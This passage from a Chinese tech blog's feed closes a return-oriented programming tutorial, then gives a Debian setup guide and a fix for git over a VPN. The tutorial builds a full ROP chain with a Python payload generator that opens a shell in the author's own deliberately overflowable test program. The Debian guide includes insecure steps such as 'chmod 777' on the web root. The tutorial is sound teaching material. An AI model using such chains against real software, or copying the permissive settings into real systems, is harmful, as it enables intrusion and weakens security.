&lt;p&gt;条件跳转甚至函数调用都可以用精心构造出的&lt;strong&gt;gadgets链&lt;/strong&gt;来模拟。只要找出一些基本的&lt;strong&gt;gadgets&lt;/strong&gt;，就可以使用这些&lt;strong&gt;gadgets&lt;/strong&gt;来组装出复杂的攻击程序。而只要被攻击程序的代码量有一定的规模，就不难在这个程序的代码段中搜索出足够多的&lt;strong&gt;gadgets&lt;/strong&gt;（注意目标程序的代码中不需要真正有这样的指令，只需要恰好有这样的指令的机器码，例如如果需要用到跳板指令&lt;strong&gt;pop rax; ret&lt;/strong&gt;，只需要目标程序的代码段中含有字节码串&lt;strong&gt;58 C3&lt;/strong&gt;就可以了）。&lt;/p&gt;

&lt;p&gt;下面以实例来展示一下&lt;strong&gt;ROP攻击&lt;/strong&gt;的强大，在这个例子中，将利用&lt;strong&gt;gadgets&lt;/strong&gt;组装出程序，执行&lt;strong&gt;exec系统调用&lt;/strong&gt;打开一个&lt;strong&gt;shell&lt;/strong&gt;终端。&lt;/p&gt;

&lt;p&gt;用exec系统调用打开一个shell终端需要的参数和指令如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        mov rax, 0x3b   ; system call number, 0x3b for sys_exec
        mov rdi, PROG   ; char *prog (program path)
        mov rsi, 0      ; char **agcv
        mov rdx, 0      ; char **env
        syscall
PROG:   DB &quot;/bin/sh&quot;, 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中rax为系统调用编号，rdi为字符串指针、指向可执行程序的完整路径，rsi和rdx都是字符串指针数组，保存了参数列表和环境变量，在此处可以直接置为0。&lt;/p&gt;

&lt;p&gt;为了增大被攻击程序的体积，以搜索到尽可能多的gadgets，在原来的代码中增加一个&lt;strong&gt;random函数&lt;/strong&gt;，同时用静态链接的方式重新编译一下victim.c：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat victim.c
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main() {
    char name[64];
    printf(&quot;What's your name?&quot;);
    scanf(&quot;%s&quot;, name);
    printf(&quot;Hello, %s%ld!\n&quot;, name, random());
    return 0;
}
$ gcc -o victim victim.c -static
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;手工搜索目标程序中的gadgets显然是不现实的，采用JonathanSalwan编写的&lt;strong&gt;ROPgadget&lt;/strong&gt;搜索，网址在这里：&lt;a href=&quot;https://github.com/JonathanSalwan/ROPgadget&quot;&gt;https://github.com/JonathanSalwan/ROPgadget&lt;/a&gt;，可以使用pip安装：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ su
$ apt-get install python-pip
$ pip install capstone
$ pip install ropgadget
$ exit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;安装完成后，可以使用下面的命令来搜索&lt;strong&gt;gadgets&lt;/strong&gt;：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ROPgadget --binary ./victim --only &quot;pop|ret&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;搜索到程序中存在的跳板指令只是第一步。接下来需要挑选并组装gadgets，过程非常繁琐、复杂，不再叙述了。总之，经过多次尝试，最后找到了以下gadgets：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x00000000004003f2 : pop r12 ; ret
0x00000000004018ed : pop r12 ; pop r13 ; ret
0x0000000000487318 : mov rdi, rsp ; call r12
0x0000000000431b3d : pop rax ; ret
0x00000000004333d9 : pop rdx ; pop rsi ; ret
0x000000000043d371 : syscall
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;按下图的方式拼装gadgets，图中的‘+’号旁边的数字0、1、2、…、13表示攻击程序执行过程中rip和rsp的移动顺序。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;               Stack                                          Code
name--&amp;gt;+--------------------+                           +--------------+0&amp;lt;--rip
       | &quot;\x00&quot;*72          |                           | ret          |
rsp--&amp;gt;0+--------------------+                           +--------------+
       | 0x00000000004003f2 |-----------------------+   | ...          |
      1+--------------------+                       +--&amp;gt;+--------------+1
       | 0x00000000004018ed |---------------------+     | pop r12      |
    2,5+--------------------+                     |     +--------------+2
       | 0x0000000000487318 |------------------+  |     | ret          |
  3,4,6+--------------------+                  |  |     +--------------+
       | &quot;/bin/sh\x00&quot;      |                  |  |     | ...          |
      7+--------------------+                  |  +----&amp;gt;+--------------+5
       | 0x0000000000431b3d |--------------+   |        | pop r12      |
      8+--------------------+              |   |        +--------------+6
       | 0x000000000000003b |              |   |        | pop r13      |
      9+--------------------+              |   |        +--------------+7
       | 0x00000000004333d9 |-----------+  |   |        | ret          |
     10+--------------------+           |  |   |        +--------------+
       | 0x0000000000000000 |           |  |   |        | ...          |
     11+--------------------+           |  |   +-------&amp;gt;+--------------+3
       | 0x0000000000000000 |           |  |            | mov rdi, rsp |
     12+--------------------+           |  |            +--------------+4
       | 0x000000000043d371 |-------+   |  |            | call r12     |
     13+--------------------+       |   |  |            +--------------+
                                    |   |  |            | ...          |
                                    |   |  +-----------&amp;gt;+--------------+8
                                    |   |               | pop rax      |
                                    |   |               +--------------+9
                                    |   |               | ret          |
                                    |   |               +--------------+
                                    |   |               | ...          |
                                    |   +--------------&amp;gt;+--------------+10
                                    |                   | pop rsi      |
                                    |                   +--------------+11
                                    |                   | pop rdx      |
                                    |                   +--------------+12
                                    |                   | ret          |
                                    |                   +--------------+
                                    |                   | ...          |
                                    +------------------&amp;gt;+--------------+13
                                                        | syscall      |
                                                        +--------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;为了将大端顺序的地址数值转换为小端顺序的字符串，编写了一个python程序&lt;strong&gt;gen_shellcode.py&lt;/strong&gt;来生成最终的shellcode：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; s= long2bytes(0x5c4)
&amp;gt;&amp;gt;&amp;gt; s
'\xc4\x05\x00\x00\x00\x00\x00\x00'
def long2bytes(x):
    ss = [&quot;&quot;] * 8
    for i in range(8):
        ss[i] = chr(x &amp;amp; 0xff)
        x &amp;gt;&amp;gt;= 8
    return &quot;&quot;.join(ss)

print &quot;\x00&quot;*72 + \
    long2bytes(0x4003f2) + \
    long2bytes(0x4018ed) + \
    long2bytes(0x487318) + \
    &quot;/bin/sh\x00&quot; + \
    long2bytes(0x431b3d) + \
    long2bytes(0x00003b) + \
    long2bytes(0x4333d9) + \
    long2bytes(0x000000) + \
    long2bytes(0x000000) + \
    long2bytes(0x43d371)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;现在可以实施攻击了：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python gen-shellcode.py &amp;gt; shellcode
$ cat shellcode - | ./victim
What's your name?Hello, 1804289383!
ls
gen-shellcode.py  shellcode  victim  victim.c
mkdir xxx
ls
gen-shellcode.py  shellcode  victim  victim.c xxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看出终端被成功打开，ls和mkdir命令都可以运行。&lt;/p&gt;

&lt;h3 id=&quot;5-致谢&quot;&gt;5. 致谢&lt;/h3&gt;

&lt;p&gt;感谢jip的文章 &lt;a href=&quot;https://www.exploit-db.com/exploits/24085/&quot;&gt;Stack Smashing On A Modern Linux System&lt;/a&gt; 和Ben Lynn的文章   &lt;a href=&quot;http://crypto.stanford.edu/~blynn/rop/&quot;&gt;64-bit Linux Return-Oriented Programming&lt;/a&gt; ，他们的文章系统的介绍了Linux（x64）下的栈溢出攻击和防护方法。&lt;/p&gt;

&lt;p&gt;感谢 Erik Buchanan, Ryan Roemer 和 Stefan Savage 等人对ROP做出的非凡的工作：&lt;a href=&quot;http://cseweb.ucsd.edu/~hovav/talks/blackhat08.html&quot;&gt;Return-Oriented Programming: Exploits Without Code Injection&lt;/a&gt;，ROP攻击几乎无法阻挡，强大之中又蕴涵着优雅的美感，就像风清杨教给令狐冲的独孤九剑。&lt;/p&gt;

&lt;p&gt;感谢JonathanSalwan编写的&lt;a href=&quot;https://github.com/JonathanSalwan/ROPgadget&quot;&gt;ROPgadget&lt;/a&gt;，他的工具让搜索gadgets的工作变得简单无比。&lt;/p&gt;</content><author><name></name></author><category term="[&quot;Security&quot;]" /><summary type="html">如果你学的第一门程序语言是C语言，那么下面这段程序很可能是你写出来的第一个有完整的 “输入—处理—输出” 流程的程序： #include &amp;lt;stdio.h&amp;gt; int main() { char name[64]; printf(&quot;What's your name?&quot;); scanf(&quot;%s&quot;, name); printf(&quot;Hello, %s!\n&quot;, name); return 0; }</summary></entry><entry><title type="html">Debian 安装和使用</title><link href="https://pandolia.net/maintenance/2016/01/10/debiansetup/" rel="alternate" type="text/html" title="Debian 安装和使用" /><published>2016-01-10T00:00:00+08:00</published><updated>2016-01-10T00:00:00+08:00</updated><id>https://pandolia.net/maintenance/2016/01/10/debiansetup</id><content type="html" xml:base="https://pandolia.net/maintenance/2016/01/10/debiansetup/">&lt;p&gt;本文介绍 Debian 系统的安装和使用问题。&lt;/p&gt;

&lt;!--more--&gt;

&lt;h3 id=&quot;1-系统安装&quot;&gt;1、 系统安装&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;在Vitualbox中安装Debian8（xfce）&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;见 &lt;a href=&quot;https://mralphaville.wordpress.com/2015/05/01/how-to-install-debian-8-jessie-as-a-virtual-machine&quot;&gt;mralphaville的Blog&lt;/a&gt; 。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;在Windows下通过U盘安装Debian 7.0 Wheezy&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;首先通过 &lt;a href=&quot;http://www.debian.org/distrib/netinst&quot;&gt;http://www.debian.org/distrib/netinst&lt;/a&gt;, 在 Tiny CDs, USB sticks, etc. 下面, 找到对应的下载列表, 如x86-64bit, 则选择：&lt;a href=&quot;http://ftp.nl.debian.org/debian/dists/wheezy/main/installer-amd64/current/images&quot;&gt;http://ftp.nl.debian.org/debian/dists/wheezy/main/installer-amd64/current/images&lt;/a&gt; 点击左侧列表里的 hd-media , 下载其中的boot.img.gz, 其他的都不用下。&lt;/p&gt;

&lt;p&gt;在windows下, 解开boot.img.gz, 会得到一个img文件。用&lt;code class=&quot;highlighter-rouge&quot;&gt;UltraISO&lt;/code&gt;, “启动”-&amp;gt;”写入硬盘镜像”, 选择你的U盘, 写入方式使用USB-HDD, 将这个img 写到U盘上。&lt;/p&gt;

&lt;p&gt;成功后, “便捷启动”-&amp;gt; “写入新的硬盘主引导记录MBR” -&amp;gt; USB-HDD。&lt;/p&gt;

&lt;p&gt;再下载你需要安装的ISO, 在  &lt;a href=&quot;http://www.debian.org/distrib/netinst&quot;&gt;http://www.debian.org/distrib/netinst&lt;/a&gt; 的 Small CDs 下面选择合适你的系统的ISO文件,下载后,将这个ISO文件复制到你的U盘根目录下。&lt;/p&gt;

&lt;p&gt;然后将电脑设置为U盘启动, 就可以看到Debian的安装界面了。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;用Grub通过硬盘安装Debian8.4.0&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;电脑中已经安装了Win7和Debian7双系统，用Grub启动。则可以用Grub从硬盘安装Debian8。&lt;/p&gt;

&lt;p&gt;首先下载安装&lt;code class=&quot;highlighter-rouge&quot;&gt;镜像文件debian-8.4.0-amd64-DVD-1.iso&lt;/code&gt;，到&lt;a href=&quot;http://cdimage.debian.org/debian-cd/8.4.0/amd64/bt-dvd/&quot;&gt;这里&lt;/a&gt;下载。然后下载内核引导程序文件&lt;code class=&quot;highlighter-rouge&quot;&gt;initrd.gz&lt;/code&gt; 和&lt;code class=&quot;highlighter-rouge&quot;&gt;vmlinuz&lt;/code&gt; ，到&lt;a href=&quot;http://ftp.nl.debian.org/debian/dists/Debian8.4/main/installer-amd64/current/images/hd-media/&quot;&gt;这里&lt;/a&gt;下载。注意&lt;code class=&quot;highlighter-rouge&quot;&gt;initrd.gz&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;vmlinuz&lt;/code&gt;的版本必须和&lt;code class=&quot;highlighter-rouge&quot;&gt;镜像iso文件&lt;/code&gt;的版本一致。&lt;/p&gt;

&lt;p&gt;内核引导程序文件（&lt;code class=&quot;highlighter-rouge&quot;&gt;initrd.gz&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;vmlinuz&lt;/code&gt;）可以放在硬盘的任何分区的任意目录，但&lt;code class=&quot;highlighter-rouge&quot;&gt;安装镜像文件debian-8.4.0-amd64-DVD-1.iso&lt;/code&gt;必须放在FAT32或EXT文件系统的分区（否则内核引导程序无法识别出镜像文件）。这里为方便起见，假定电脑中D盘为FAT32文件系统，把这三个文件全部放在D盘的根目录下。若硬盘中没有FAT32分区，可以用Win7自带的磁盘管理新建一个FAT32分区。&lt;/p&gt;

&lt;p&gt;之后在Debian系统下编辑&lt;code class=&quot;highlighter-rouge&quot;&gt;/boot/grub/grub.cfg&lt;/code&gt;，在该文件的最后增加一个启动项：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;menuentry &quot;Debian DVD 8.4.0&quot; {
    linux (hd0,msdos5)/vmlinuz
    initrd (hd0,msdos5)/initrd.gz
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里&lt;code class=&quot;highlighter-rouge&quot;&gt;(hd0,msdos5)&lt;/code&gt;代表硬盘的上的&lt;code class=&quot;highlighter-rouge&quot;&gt;msdos5分区&lt;/code&gt;，即&lt;code class=&quot;highlighter-rouge&quot;&gt;D盘&lt;/code&gt;。分区编号规则为：主分区（C盘）为msdos，第一个逻辑分区（D盘）为msdos5，第二个逻辑分区（E盘）为msdos6…（可以在Grub启动电脑时，按&lt;code class=&quot;highlighter-rouge&quot;&gt;c键&lt;/code&gt;进入命令行模式，运行&lt;code class=&quot;highlighter-rouge&quot;&gt;ls命令&lt;/code&gt;可以查看所有分区）。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;grub.cfg&lt;/code&gt;文件修改完毕保存，重启电脑就可以看到Grub启动菜单中多了一个&lt;code class=&quot;highlighter-rouge&quot;&gt;Debian DVD 8.4.0&lt;/code&gt;的启动项了，进入这个启动项就开始安装Debian8了。这里千万要注意不能将Debian安装到镜像iso文件所在的分区上，否则已安装的系统都会挂掉。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;grub.cfg&lt;/code&gt;文件中的&lt;code class=&quot;highlighter-rouge&quot;&gt;linux (hd0,msdos5)/vmlinuz&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;initrd (hd0,msdos5)/initrd.gz&lt;/code&gt;命令指定了内核引导程序文件所在的位置，Grub会加载这两个文件中的引导程序，之后引导程序会在硬盘的所有FAT32和EXT分区中搜索安装镜像iso文件，搜索到合法的安装镜像文件后会自动启动iso文件开始安装。&lt;/p&gt;

&lt;h3 id=&quot;2-软件安装及配置&quot;&gt;2、 软件安装及配置&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;配置源：&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ su
$ nano /etc/apt/sources.list
... # 只保留以下两行:
deb http://ftp.cn.debian.org/debian jessie-backports main
deb http://http.debian.net/debian/ jessie main contrib non-free
$ apt-get update
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;将普通用户加入sudo用户组：&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ apt-get install sudo
$ chmod +w /etc/sudoers
$ nano /etc/sudoers
... # 在 root   ALL=(ALL:ALL) ALL 的后面加入：
user    ALL=(ALL:ALL) ALL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;笔记本电脑安装 wifi ：&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ apt-get update &amp;amp;&amp;amp; apt-get install firmware-iwlwifi
$ modprobe -r iwlwifi; modprobe iwlwifi
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;中文输入：&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ apt-get install ibus ibus-sunpinyin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;开发工具：&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ aptitude install build-essential
$ apt-get install git gdb nasm cmake
$ apt-get install python-dev
$ apt-get install python-pip
$ apt-get install spyder qtcreator
$ apt-get install openssl libssl-dev
$ apt-get install mysql-server
$ git clone https://github.com/mysql/mysql-connector-python.git
$ cd mysql-connector-python
$ python setup.py install
$ apt-get install apache2
$ apt-get install php5 php5-mysql
$ chmod 777 /var/www/html
$ /etc/init.d/apache2 -k restart
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;注意安装 &lt;strong&gt;build-essential&lt;/strong&gt; 时，由于系统自带的 &lt;strong&gt;libc&lt;/strong&gt; 包和源中的版本不一致，可能会导致冲突，必须使用 &lt;strong&gt;aptitude&lt;/strong&gt; 命令安装，安装过程中根据提示对 &lt;strong&gt;libc&lt;/strong&gt; 进行 &lt;strong&gt;downgrade&lt;/strong&gt; ，之后才能正常安装。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;安装 nodejs ：&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ apt-get install nodejs npm nodejs-legacy
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;ruby和jekyll安装：&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ apt-get install ruby ruby-dev
$ gem sources --remove https://rubygems.org/
$ gem sources -a https://ruby.taobao.org/
$ gem sources -l
*** CURRENT SOURCES ***
https://ruby.taobao.org
# 请确保只有 ruby.taobao.org
$ gem install jekyll
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;iceweasel 的 flash player 插件安装：&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ apt-get install flashplugin-nonfree   # 安装
$ update-flashplugin-nonfree --install  # 更新
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;lantern 安装：&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ apt-get install libappindicator1 libappindicator3-1
$ dpkg -i google-chrome-stable_current_amd64.deb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中 &lt;strong&gt;google-chrome-stable_current_amd64.deb&lt;/strong&gt; 需要到&lt;a href=&quot;https://github.com/getlantern/lantern&quot;&gt; lantern 官网&lt;/a&gt;下载。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;VirtualBox增强功能安装（虚拟机）&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ uname -a
$ apt-get install linux-headers-3.16.0-4-amd64   # linux-headers的版本根据 uname 命令得到
$ sh ./VBoxLinuxAdditions.run                    # 先 cd 到 VBoxLinuxAdditions 的光盘目录
$ usermod -a -G vboxsf yourname                  # 把 yourname 增加到 vboxsf 组中，这样 yourname 用户也能使用共享文件夹了
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;时区和时间设置&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;设置时区：&lt;code class=&quot;highlighter-rouge&quot;&gt;dpkg-reconfigure tzdata&lt;/code&gt;，设置时间：&lt;code class=&quot;highlighter-rouge&quot;&gt;date -s 20160212; date -s 21:24:06&lt;/code&gt;。&lt;/p&gt;

&lt;h3 id=&quot;3-使用问题&quot;&gt;3、 使用问题&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;chmod 命令没效果&lt;/strong&gt;
这是因为文件在 windows 的 ntfs 分区上，不支持 Ｌinux 下的用户 permissions 等特性，需要将文件拷贝至 ext 分区上。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;右键菜单没有 open in terminal 选项&lt;/strong&gt;
安装 caja-open-terminal ，&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo apt-get install caja-open-terminal&lt;/code&gt; 。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;右键菜单中加入项： “在 sumblimetext 中打开当前目录”&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Debian 8.4 Mate下，在 &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.config/caja/scripts&lt;/code&gt; 目录下，新建一个名为 &lt;code class=&quot;highlighter-rouge&quot;&gt;Open folder in sublimetext&lt;/code&gt; 的文件，将其设置为可执行，并输入以下内容：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;~/ProgramFiles/sublime_text_3/sublime_text&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;CAJA_SCRIPT_CURRENT_URI&lt;/span&gt;:7&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;caja scripts 中用到的一些 variables ： &lt;a href=&quot;http://misawascriptkid.blogspot.com/2012/06/caja.html&quot;&gt;http://misawascriptkid.blogspot.com/2012/06/caja.html&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="[&quot;Maintenance&quot;]" /><summary type="html">本文介绍 Debian 系统的安装和使用问题。</summary></entry><entry><title type="html">用 VPN 上网时如何使用 Git</title><link href="https://pandolia.net/network/2016/01/05/vpn-howto/" rel="alternate" type="text/html" title="用 VPN 上网时如何使用 Git" /><published>2016-01-05T00:00:00+08:00</published><updated>2016-01-05T00:00:00+08:00</updated><id>https://pandolia.net/network/2016/01/05/vpn-howto</id><content type="html" xml:base="https://pandolia.net/network/2016/01/05/vpn-howto/">&lt;p&gt;使用VPN上网时，如果使用git向远程仓库push代码，可能会出现下面的错误：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git push
ssh: connect to host github.com port 22: Connection timed out
fatal: Could not read from remote repository.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;!--more--&gt;

&lt;p&gt;google到stackoverflow有人问了同样的问题： &lt;a href=&quot;http://stackoverflow.com/questions/757432/git-push-pull-times-out/757462#757462&quot;&gt;git push pull times out&lt;/a&gt; ，上面给出的原因和解决办法是：“This sort of effect is usually due to the VPN setup routing all your traffic over the VPN. You can work around that by updating your routing tables to route traffic to github back over your Ethernet (I assume) interface rather than over the VPN. For example &lt;strong&gt;route add 65.74.177.129 eth0&lt;/strong&gt; will route traffic to github over eth0. ” 意思是VPN开启后会将所有数据都通过VPN传递，解决方法是更新路由表使所有发送到（或接收）github的数据都通过原来的网卡来传递。&lt;/p&gt;

&lt;p&gt;但按上面给出的命令 &lt;strong&gt;route add 65.74.177.129 eth0&lt;/strong&gt; 设置后问题却仍然没有解决。google到一篇博文 &lt;a href=&quot;http://matrix207.github.io/2014/04/25/how-to-do-git-push-under-vpn&quot;&gt;how to do git push under vpn&lt;/a&gt; ，提出了需要设置网关，但按此文的方法设置后还是不行。&lt;/p&gt;

&lt;p&gt;再google了一下route的使用，搜到这样一篇博文：&lt;a href=&quot;http://www.cnblogs.com/longzhongren/p/4220599.html&quot;&gt;route详解&lt;/a&gt;，上面有一条这样的命令及解释：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.30.1 dev eth1
# 新增一个路由规则！ 意思是所有以 192.168.*.* 开头的IP的数据的网关是192.168.30.1，
# 并指定通过eth1进出。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;按此命令重新设置了一下，问题得以解决。详细步骤如下：&lt;/p&gt;

&lt;p&gt;首先用 &lt;strong&gt;ping&lt;/strong&gt; 命令获取 github 的IP地址：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ping github.com
PING github.com (192.30.252.130) 56(84) bytes of data.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后用 &lt;strong&gt;route&lt;/strong&gt; 命令查看一下路由表：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# su
# route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         *               0.0.0.0         U     1024   0        0 ppp0
10.0.0.4        *               255.255.255.255 UH    0      0        0 ppp0
192.168.31.0    *               255.255.255.0   U     0      0        0 eth0
203.79.187.188  192.168.31.1    255.255.255.255 UGH   0      0        0 eth0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到本机有两个连接，一个是VPN连接（也就是ppp0），另一个是以太网卡连接（eth0），若使用无线网卡上网，这里可能是wlan0。另外可以看到一个网关地址 &lt;strong&gt;192.168.31.1&lt;/strong&gt; 。现在把通向 &lt;strong&gt;github&lt;/strong&gt; 的数据指定到 &lt;strong&gt;eth0&lt;/strong&gt; 进出就可以了，命令为：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# route add -net 192.30.252.0 netmask 255.255.255.0 gw 192.168.31.1 dev eth0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;设置后，可以正常运行 &lt;strong&gt;git push&lt;/strong&gt; 命令了。本篇文章就是按此设置后push到服务器的。^_^&lt;/p&gt;

